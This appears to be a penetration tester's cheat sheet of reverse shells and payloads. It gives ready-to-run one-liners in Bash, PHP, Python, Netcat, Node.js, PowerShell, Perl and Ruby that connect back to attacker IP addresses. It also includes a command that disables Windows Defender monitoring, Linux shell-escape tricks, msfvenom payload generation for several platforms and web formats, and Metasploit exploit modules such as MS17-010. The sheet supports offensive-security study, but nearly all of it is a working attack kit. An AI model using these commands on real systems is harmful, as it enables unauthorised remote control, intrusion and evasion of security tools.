# Shells and Payloads

## **Introduction**

> There are many different ways to "pop" a reverse shell. Check out the different paylads provided in my notes, but keep in mind that there are many different resources online\
> External Resources:
>
> * [RevShells.com](https://www.revshells.com/)
> * [HackTricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/linux)

***

## **Bash Reverse Shells**

```
(1) bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
(2) bash -c "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"
(2) 0<&196;exec 196<>/dev/tcp/192.168.1.101/80; sh <&196 >&196 2>&196
```

***

## **PHP Reverse Shells**

```
(1) <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/"ATTACKING IP"/443 0>&1'");?>
(2) PentestMonkey PHP Reverse Shell: https://github.com/flast101/reverse-shell-cheatsheet/blob/master/php-reverse-shell.php
```

***

## **Python Reverse Shells**

```
(1) python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
(2) __import__("os").system("bash -c 'bash -i >& /dev/tcp/10.0.0.10/666 0>&1'")
(3) Python TTY: python -c 'import pty; pty.spawn("/bin/sh")'
```

***

## **Netcat Reverse Shells**

```
(1) nc 192.168.1.101 5555 -e /bin/bash
(2) rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p
```

***

## **Node.js Reverse Shells**

```
(1) require('child_process').exec('bash -i >& /dev/tcp/10.0.0.1/80 0>&1');
(2) JSShell: https://github.com/shelld3v/JSshell
```

***

## **Powershell Payloads**

```
(1) Reverse Shell: powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535\|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 \| Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
(2) Disable real time monitoring in Windows Defender: Set-MpPreference -DisableRealtimeMonitoring $true
```

***

## **Perl Reverse Shells**

```
(1) perl -e 'exec "/bin/sh";'
(2) perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

***

## **Ruby Reverse Shells**

```
(1) ruby -rsocket -e'f=TCPSocket.open("ATTACKING-IP",80).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

***

## **Linux Payloads**

```
(1) Spawn interactive shell: awk 'BEGIN {system("/bin/sh")}' 
(2) Spawn interactive shell: find / -name nameoffile 'exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
(3) Spawn interactive shell: find . -exec /bin/sh \; -quit 
(4) Spawn interactive shell: vim -c ':!/bin/sh'
```

***

## **Msfconsole & Msfvenom**

| Commands                                                                                          | Description                                                                                                                 |
| ------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------- |
| use exploit/windows/smb/psexec                                                                    | Metasploit exploit module that can be used on vulnerable Windows system to establish a shell session utilizing smb & psexec |
| shell                                                                                             | Command used in a meterpreter shell session to drop into a system shell                                                     |
| msfvenom -p linux/x64/shell\_reverse\_tcp LHOST=10.10.14.113 LPORT=443 -f elf > nameoffile.elf    | MSFvenom command used to generate a linux-based reverse shell stageless payload                                             |
| msfvenom -p windows/shell\_reverse\_tcp LHOST=10.10.14.113 LPORT=443 -f exe > nameoffile.exe      | MSFvenom command used to generate a Windows-based reverse shell stageless payload                                           |
| msfvenom -p osx/x86/shell\_reverse\_tcp LHOST=10.10.14.113 LPORT=443 -f macho > nameoffile.macho  | MSFvenom command used to generate a MacOS-based reverse shell payload                                                       |
| msfvenom -p windows/meterpreter/reverse\_tcp LHOST=10.10.14.113 LPORT=443 -f asp > nameoffile.asp | MSFvenom command used to generate a ASP web reverse shell payload                                                           |
| msfvenom -p java/jsp\_shell\_reverse\_tcp LHOST=10.10.14.113 LPORT=443 -f raw > nameoffile.jsp    | MSFvenom command used to generate a JSP web reverse shell payload                                                           |
| msfvenom -p java/jsp\_shell\_reverse\_tcp LHOST=10.10.14.113 LPORT=443 -f war > nameoffile.war    | MSFvenom command used to generate a WAR java/jsp compatible web reverse shell payload                                       |
| use auxiliary/scanner/smb/smb\_ms17\_010                                                          | Metasploit exploit module used to check if a host is vulnerable to ms17\_010                                                |
| use exploit/windows/smb/ms17\_010\_psexec                                                         | Metasploit exploit module used to gain a reverse shell session on a Windows-based system that is vulnerable to ms17\_010    |
| use exploit/linux/http/rconfig\_vendors\_auth\_file\_upload\_rce                                  | Metasploit exploit module that can be used to optain a reverse shell on a vulnerable linux system hosting rConfig 3.9.6     |

***

## **Kali Linux Web Shells**

> You can find some web shells within Kali Linux, under `/usr/share/webshells`